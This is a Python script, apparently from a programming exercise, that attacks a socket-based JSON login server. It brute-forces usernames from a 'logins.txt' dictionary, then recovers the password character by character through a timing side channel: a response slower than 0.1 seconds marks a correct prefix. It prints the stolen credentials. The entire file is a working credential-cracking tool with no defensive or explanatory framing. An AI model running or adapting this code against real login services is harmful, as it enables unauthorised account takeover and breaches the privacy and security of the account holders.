import argparse

import json
import logging
from time import time
import socket
from typing import Dict

from result import Result

from guess_generators import generate_from_dict, constant_length_generator


def set_up_logging():
    _logger = logging.getLogger()
    _logger.setLevel(logging.INFO)
    console_handler = logging.StreamHandler()
    log_format = '%(levelname)s: %(message)s'
    console_handler.setFormatter(logging.Formatter(log_format))
    _logger.addHandler(console_handler)
    return _logger

def set_up_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip_address", help="IP address of the server")
    parser.add_argument("port", help="port of the server")
    return parser.parse_args()

def send_and_receive(client: socket, guess: Dict[str, str]):
    start = time()
    client.send(json.dumps(guess).encode())
    response = client.recv(1024).decode()
    response_time = time() - start
    try:
        result = Result(json.loads(response)["result"])
    except KeyError:
        logger.warning(f"Unknown result: {json.loads(response)['result']}")
        exit(0)
    return result, response_time

def hack_login(client: socket) -> str:
    login_guesser = generate_from_dict("logins.txt")
    result = Result.WRONG_LOGIN
    while result is Result.WRONG_LOGIN:
        guess = {"login": next(login_guesser), "password": "1234"}
        logger.debug(f"Sending login guess '{guess['login']}'")
        result, _ = send_and_receive(client, guess)
        if result is Result.BAD_REQUEST:
            logger.warning(f"Bad request: {guess}")
            exit(0)
    logger.info(f"Found login: {guess['login']}")
    return guess["login"]

def hack_pw(client: socket, known_login: str) -> Dict[str, str]:
    base = ""
    while True:
        pw_guesser = constant_length_generator(base)
        response_time = 0
        while response_time < 0.1:
            try:
                guess = {"login": known_login, "password": next(pw_guesser)}
                logger.debug(guess)
            except StopIteration:
                logger.error(f"Ran out of combinations at: {guess}")
                exit(0)
            result, response_time = send_and_receive(client, guess)
            logger.debug(f"Response {result} in {response_time}")
            match result:
                case Result.BAD_REQUEST:
                    logger.warning(f"Bad request: {guess}")
                    exit(0)
                case Result.SUCCESS:
                    return guess
        # Exception instead of WRONG_PASSWORD: guess is beginning of correct pw
        base = guess["password"]
        logger.debug(f"new base: {base}")


if __name__ == "__main__":
    logger = set_up_logging()
    args = set_up_parser()

    with socket.socket() as client_socket:
        address = (args.ip_address, int(args.port))
        client_socket.connect(address)
        login = hack_login(client_socket)
        credentials = hack_pw(client_socket, login)
        print(json.dumps(credentials))
